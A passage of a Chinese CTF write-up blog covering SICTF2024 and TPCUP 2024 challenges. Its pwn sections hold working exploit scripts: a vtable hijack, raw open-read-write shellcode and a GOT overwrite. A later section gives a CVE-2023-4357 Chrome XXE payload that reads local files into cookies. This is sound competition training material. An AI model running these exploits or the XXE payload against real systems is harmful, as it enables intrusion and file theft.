class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;command:&#x27;</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\0x00&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>,</span><br><span class="line">    backdoor</span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Eeeeasy-Cpp"><a href="#Eeeeasy-Cpp" class="headerlink" title="Eeeeasy Cpp"></a>Eeeeasy Cpp</h3><p>思路是泄露堆地址然后伪造vtable，把虚表指针指向伪造的vtable再call⼀下完成利⽤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> def <span class="built_in">get</span>(name, passwd):</span><br><span class="line"><span class="number">6</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">7 p.sendline(b&#x27;</span>G<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">8</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">9 p.sendline(name)</span></span><br><span class="line"><span class="string">10 p.recvuntil(b&#x27;</span>password: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">11 p.sendline(passwd)</span></span><br><span class="line"><span class="string">12</span></span><br><span class="line"><span class="string">13 def show():</span></span><br><span class="line"><span class="string">14 p.recvuntil(b&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">15 p.sendline(b&#x27;</span>P<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">1617</span> <span class="meta">#p = process(<span class="string">&#x27;./EeeeasyCpp&#x27;</span>)</span></span><br><span class="line"><span class="number">18</span> p = <span class="built_in">remote</span>(<span class="string">&#x27;xxxxxx&#x27;</span>, xxxx)</span><br><span class="line"><span class="number">19</span> <span class="meta"># set offset to 0x40 to check <span class="keyword">if</span> the offset is correct by comparing with vtable</span></span><br><span class="line"><span class="number">20</span> offset = <span class="number">0x48</span></span><br><span class="line"><span class="number">21</span> <span class="keyword">try</span>:</span><br><span class="line"><span class="number">22</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>gift: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">23 main = int(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="number">24</span> base = main - <span class="number">0x2650</span></span><br><span class="line"><span class="number">25</span> <span class="built_in">success</span>(<span class="string">&#x27;base addr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(base)))</span><br><span class="line"><span class="number">26</span> backdoor = base + <span class="number">0x22e0</span></span><br><span class="line"><span class="number">27</span> vtable = base + <span class="number">0x4d48</span></span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">29</span> <span class="built_in">info</span>(<span class="string">&#x27;vtable -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(vtable)))</span><br><span class="line"><span class="number">30</span> <span class="meta">#gdb.attach(p)</span></span><br><span class="line"><span class="number">31</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">32</span> b<span class="number">&#x27;123&#x27;</span>,</span><br><span class="line"><span class="number">33</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">34</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">35</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">36</span> vtable, <span class="built_in">bytes</span>([offset])</span><br><span class="line"><span class="number">37</span> ])</span><br><span class="line"><span class="number">38</span> )</span><br><span class="line"><span class="number">39</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">40</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>Name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">41 ptr = u64(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"><span class="number">42</span> <span class="meta"># heap</span></span><br><span class="line"><span class="number">43</span> <span class="built_in">success</span>(<span class="string">&#x27;ptr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(ptr)))</span><br><span class="line"><span class="number">44</span> <span class="keyword">if</span> ptr == <span class="number">0</span>:</span><br><span class="line"><span class="number">45</span> raise <span class="built_in">Exception</span>(<span class="string">&#x27;name addr is 0&#x27;</span>)</span><br><span class="line"><span class="number">46</span> <span class="meta"># rollback</span></span><br><span class="line"><span class="number">47</span> name_addr = ptr - <span class="number">0x38</span></span><br><span class="line"><span class="number">48</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">49</span> <span class="built_in">flat</span>([name_addr]),</span><br><span class="line"><span class="number">50</span> <span class="built_in">flat</span>([<span class="number">0x21</span>])</span><br><span class="line"><span class="number">51</span> )</span><br><span class="line"><span class="number">52</span> <span class="meta"># <span class="keyword">if</span> name is 123, rollback success</span></span><br><span class="line"><span class="number">53</span> <span class="meta"># show()</span></span><br><span class="line"><span class="number">54</span> fake_vtable = name_addr</span><br><span class="line"><span class="number">55</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">56</span> <span class="built_in">flat</span>([backdoor, backdoor]), <span class="meta"># check by setting backdoor to main</span></span><br><span class="line"><span class="number">57</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">58</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">59</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">60</span> fake_vtable, name_addr</span><br><span class="line"><span class="number">61</span> ])</span><br><span class="line"><span class="number">62</span> )</span><br><span class="line"><span class="number">63</span> <span class="meta"># get or show will trigger the backdoor</span></span><br><span class="line"><span class="number">64</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">65</span> p.<span class="built_in">interactive</span>()</span><br><span class="line"><span class="number">66</span></span><br><span class="line"><span class="number">67</span> except Exception as e:</span><br><span class="line"><span class="number">68</span> <span class="built_in">print</span>(<span class="string">&quot;error: &quot;</span>, e)</span><br><span class="line"><span class="number">69</span> p.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper"><a href="#Bug-Zapper" class="headerlink" title="Bug Zapper"></a>Bug Zapper</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">您是否经常被bug烦恼？您是否想要⼀款安全，⾼效，没有任何额外副产出的杀⾍器？*</span><br><span class="line"></span><br><span class="line">*请选择我们！我们是值得您信赖的杀⾍专家！⽆论什么bug，我们都能⽴即甄别并处理！我们Bug*</span><br><span class="line"></span><br><span class="line">*Zapper郑重承诺，绝不放过任何⼀个shellcode！*</span><br><span class="line"></span><br><span class="line">*Bug Zapper灭⾍剂，⼀扫就灭，让bug⽆处可逃！*</span><br><span class="line"></span><br><span class="line">*Bug Zapper灭⾍剂，让你写的开⼼，⽤的放⼼。</span><br></pre></td></tr></table></figure><p>输⼊⻓度不⼤于0x10，使得syscall的时候调⽤号在0x55（creat）到0x65（ptrace）</p><p>然后需要在前三个参数都是0的情况下，syscall后返回值为0，有3个调⽤可以符合</p><p>分别是fchmod（0x5b）， gettimeofday（0x60），ptrace（0x65）</p><p>也就是分别对应了输⼊⻓度为6，11，16字节。（注意ptrace在动调时是返回-1的）</p><p>我们直接使⽤ptrace打（这题其实11字节就够了，也就是gettimeofday就能过，调试也相对⽅便），⻓度不够就把第⼆段payload给read到0x1919820后⾯，然后就是⼀波orw，不过要注意，这⾥调⽤execve会失败，直接⽤pwntools的shellcraft应该是不⾏的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> p = process(<span class="string">&#x27;./bugzapper&#x27;</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">8 add rax, 0x10 ; rax = 0x1919820</span></span><br><span class="line"><span class="string">9 mov rsi, rax</span></span><br><span class="line"><span class="string">10 mov edx, 0x80</span></span><br><span class="line"><span class="string">11 xor eax, eax</span></span><br><span class="line"><span class="string">12 syscall</span></span><br><span class="line"><span class="string">13 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">14</span> payload = <span class="string">b&#x27;H\x83\xc0\x10H\x89\xc6\xba\x80\x00\x00\x001\xc0\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">15</span> <span class="comment"># assert len(payload) == 0x10</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">17</span> p.recv()</span><br><span class="line"><span class="number">18</span> p.send(payload)</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">21 mov eax, 0x67616c66</span></span><br><span class="line"><span class="string">22 mov [esi - 0x10], rax</span></span><br><span class="line"><span class="string">23</span></span><br><span class="line"><span class="string">24 // 这⾥是确认 &quot;flag&quot; 已经写⼊了 0x1919810</span></span><br><span class="line"><span class="string">25 // write(1, 0x1919810, 0x20)</span></span><br><span class="line"><span class="string">26 mov edi, 1</span></span><br><span class="line"><span class="string">27 sub esi, 0x10 ; rsi = 0x1919810</span></span><br><span class="line"><span class="string">28 mov edx, 0x20</span></span><br><span class="line"><span class="string">29 mov eax, 0x1</span></span><br><span class="line"><span class="string">30 syscall</span></span><br><span class="line"><span class="string">31</span></span><br><span class="line"><span class="string">32 // open(&quot;flag&quot;, 0, 0)</span></span><br><span class="line"><span class="string">33 mov edi, esi</span></span><br><span class="line"><span class="string">34 xor esi, esi</span></span><br><span class="line"><span class="string">35 xor edx, edx</span></span><br><span class="line"><span class="string">36 mov eax, 2</span></span><br><span class="line"><span class="string">37 syscall</span></span><br><span class="line"><span class="string">38</span></span><br><span class="line"><span class="string">39 // read(3, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">40 mov esi, 0x1919870</span></span><br><span class="line"><span class="string">41 mov edi, 3</span></span><br><span class="line"><span class="string">42 mov edx, 0x40</span></span><br><span class="line"><span class="string">43 mov eax, 0</span></span><br><span class="line"><span class="string">44 syscall</span></span><br><span class="line"><span class="string">45</span></span><br><span class="line"><span class="string">46 // write(1, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">47 mov edi, 1</span></span><br><span class="line"><span class="string">48 mov eax, 1</span></span><br><span class="line"><span class="string">49 syscall</span></span><br><span class="line"><span class="string">50</span></span><br><span class="line"><span class="string">51 // exit(0)</span></span><br><span class="line"><span class="string">52 mov edi, 0</span></span><br><span class="line"><span class="string">53 mov eax, 0x3c</span></span><br><span class="line"><span class="string">54 syscall</span></span><br><span class="line"><span class="string">55 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">56</span> payload = <span class="string">b&#x27;\xb8flaggH\x89F\xf0\xbf\x01\x00\x00\x00\x83\xee\x10\xba\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x89\xf71\xf61\xd2\xb8\x02\x00\x00\x00\x0f\x05\xbep\x98\x91\x01\xbf\x03\x00\x00\x00\xba@\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00\xb8&lt;\x00\x00\x00\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">57</span> p.send(payload)</span><br><span class="line"><span class="number">58</span></span><br><span class="line"><span class="number">59</span> p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper-Pro"><a href="#Bug-Zapper-Pro" class="headerlink" title="Bug Zapper Pro+"></a>Bug Zapper Pro+</h3><p><em>出题⼈：椰奶</em></p><p><em>题⽬描述：感谢您⼀直以来的⽀持，所以为了回馈⽼⽤⼾，我们推出了这款全新的Bug zapper pro</em></p><p><em>+，有任何问题欢迎向我们反馈</em></p><p>通过异或等构造⼀个syscall出来，然后为了⽅便直接把rdx设置为114514xxx那玩意，所以跑脚本建议</p><p>后⾯的payload在send前最好pause⼀下，⼀起发的话有可能会由于read⻓度太⼤导致后⾯的payload</p><p>在⼀开始也被读进去（</p><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>栈溢出修改string的引⽤为stack_chk的got地址，从⽽修改got表为后⻔地址，同时覆盖canary触发后</p><p>⻔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1 from pwn import *</span><br><span class="line"></span><br><span class="line">2 context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">4 *#p = process(&#x27;./overflow&#x27;)*</span><br><span class="line"></span><br><span class="line">5 p = remote(&quot;xxxxxxxx&quot;, xxxxx)</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line"></span><br><span class="line">7 backdoor = 0x4011d0</span><br><span class="line"></span><br><span class="line">8 chk_got = 0x404018</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line"></span><br><span class="line">10 *#gdb.attach(p)*</span><br><span class="line"></span><br><span class="line">11 p.recvuntil(b&#x27;?\n&#x27;)</span><br><span class="line"></span><br><span class="line">12 payload = p64(backdoor) + b&#x27;b&#x27; * 0xa0 + p64(chk_got)</span><br><span class="line"></span><br><span class="line">13 p.sendline(payload.ljust(0x150, b&#x27;a&#x27;))</span><br><span class="line"></span><br><span class="line">14</span><br><span class="line"></span><br><span class="line">15 p.interactive()</span><br></pre></td></tr></table></figure><h3 id="What-only-libc"><a href="#What-only-libc" class="headerlink" title="What?!only libc?!"></a>What?!only libc?!</h3><h3 id="TalBoom"><a href="#TalBoom" class="headerlink" title="TalBoom"></a>TalBoom</h3><p><em>出题⼈：TokameinE</em></p><p><em>题⽬描述：我们从来奉⾏没有政策就是我们的政策，所以我们打算什么也不做，任由恐怖分⼦们闹</em>吧。（本题有回显，连接后请稍作等待）*</p><p>flag：Toka{Who_has_four_legs_in_the_morning_two_legs_at_noon_and_three_legs_in_theevening?}本题不公布任何附件。</p><p>看了⼀下⼤哥们的解法，⾮常优秀，所以在此就不公开预期解 exp 了，主要聊聊⾮预期的⼀个好办</p><p>法，来⾃Kalise师傅。</p><p>题⽬每次nc 都会构建不同的⼆进制，⽽每个⼆进制都有⼀个明显的栈溢出漏洞点，如果能够让程序到</p><p>达，则可以直接ROP完成利⽤。但是问题在于，到达的输⼊每次都是随机的，因此预期解是需要通过</p><p>⾃动化的⼿段动态分析程序来解出输⼊。但是Kalise师傅的⽅法则很简单，由于程序是类似于 Switch 的分发⽅式，所以每个⼆进制⽂件实际上</p><p>之只有那个strcmp是不同的，⽽偏移则全部相同，那么只要对着某个分⽀强⾏爆破，在预期的时间内</p><p>就可以撞出那个栈溢出，⽽只需要提取特定地址的字符串就能拿到该分⽀的输⼊，所以瞄着打就⾏</p><p>了。据该师傅所说，15分钟左右即可完成爆破。</p><p>这⾥就不放这位师傅的 exp 了</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Baby-c"><a href="#Baby-c" class="headerlink" title="Baby_c++"></a>Baby_c++</h3><p>咱也不知道怎么回事，打开IDA，查找字符串就看到了</p><p>预期是找到flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">83</span>,<span class="number">73</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">52</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">56</span>,<span class="number">97</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">100</span>,<span class="number">102</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">102</span>,<span class="number">53</span>,<span class="number">101</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">53</span>,<span class="number">49</span>,<span class="number">102</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Ez-pyc"><a href="#Ez-pyc" class="headerlink" title="Ez_pyc"></a>Ez_pyc</h3><p>pyc编译</p><p>（真服了，一直想着是走迷宫，，，，这么明显都没看出来是数独</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226125713782.png" alt="image-20240226125713782"></p><p>将解转为16进制</p><p>输⼊内容：</p><p>6320870e5352469014668584c7f3229334e22689b45a64f926b5c</p><p>得到flag</p><h3 id="SweetTofu"><a href="#SweetTofu" class="headerlink" title="SweetTofu"></a>SweetTofu</h3><p>远程动态调试可以，，我在想。虚拟机好啊。。</p><h3 id="virus-n-lys1s"><a href="#virus-n-lys1s" class="headerlink" title="virus-?n?lys1s"></a>virus-?n?lys1s</h3><p>#校验php，strpos()因为php版本太低了，web佬绕过</p><ul><li>esp定律脱壳</li><li>第二问记得挂代理（google（断</li><li>动调</li><li>启动子进程，类似于SMC的⼿段，来解密⽂件并且修复⽂件头</li><li>行为记录，wyt.exe,翻VT信息</li><li>直接微步情报（动态IP</li></ul><p><a href="https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f">https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f</a></p><h3 id="Close-me"><a href="#Close-me" class="headerlink" title="Close me"></a>Close me</h3><p><em>❤</em>*<del>杂</del>⻥~<strong>❤</strong>，你能关的掉吗~~<strong>❤</strong>（虽然不是病毒，不过如果要运⾏的话还是建议虚拟机吧*<em>^_^）</em></p><p><em>请找到能够正常关闭的条件（即不通过直接终⽌进程的⽅式或者程序崩溃导致的关闭）</em></p><h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p>⾸先翻到下⾯发现有⼀个xor，解密⼀下看看得到⼀段hint</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SICTF2024&quot;&gt;&lt;a href=&quot;#SICTF2024&quot; class=&quot;headerlink&quot; title=&quot;SICTF2024&quot;&gt;&lt;/a&gt;SICTF2024&lt;/h1&gt;&lt;h2 id=&quot;Forensics&quot;&gt;&lt;a href=&quot;#Forensics&quot; class</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>躺平杯</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-09-16T07:10:04.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TPCUP-2024"><a href="#TPCUP-2024" class="headerlink" title="TPCUP 2024"></a>TPCUP 2024</h1><h2 id="X…什么？"><a href="#X…什么？" class="headerlink" title="X…什么？"></a>X…什么？</h2><p>看到 chrome-114.0.5735.90 搜索下这个版本可以找到 CVE-2023-4357 漏洞复现，使用 <a href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">xcanwin&#x2F;CVE-2023-4357-Chrome-XXE</a> 的单文件 EXP，改成读取 flag，然后加上写入 cookies 的代码。</p><p>由于同时要有 svg 和 xml 解析，所以 Content-Type 设为 <code>image/svg+xml</code>，可以自己搭建本地环境看看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- d.svg --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;&amp;passwd_p;&quot;</span>&gt;</span>&amp;passwd_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(p =&amp;gt; &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">cookie</span>=p.<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传后访问 <code>/d.svg</code> 即可</p><p><code>flag&#123;XXE_is_alSo_y0ur_g0oD_fR13Nd&#125;</code></p><blockquote><p>没修前已经能读 <code>/etc/passwd</code> 了，但读 <code>/flag</code> 没结果。以为是没权限需要提权，结果是没放 flag（<br>话说为什么读得了 <code>/usr/src/app/requirements.txt</code> 但读不了 <code>xssbot.py</code> 呢</p></blockquote><h2 id="Uncrackable"><a href="#Uncrackable" class="headerlink" title="Uncrackable"></a>Uncrackable</h2><h3 id="更新附件后"><a href="#更新附件后" class="headerlink" title="更新附件后"></a>更新附件后</h3><p>zip 已知明文攻击，用 <code>zipinfo</code> 查看下压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">❯ zipinfo prob05.zip</span><br><span class="line">Archive:  prob05.zip</span><br><span class="line">Zip file size: 3545476 bytes, number of entries: 2</span><br><span class="line">-rw----     0.0 fat   109332 T- defN 24-Feb-13 18:53 anticheat.js</span><br><span class="line">-rw----     0.0 fat  3550103 B- defN 24-Feb-13 18:53 uncrackable.m4a</span><br><span class="line">2 files, 3659435 bytes uncompressed, 3545224 bytes compressed:  3.1%</span><br></pre></td></tr></table></figure><p><code>anticheat.js</code> 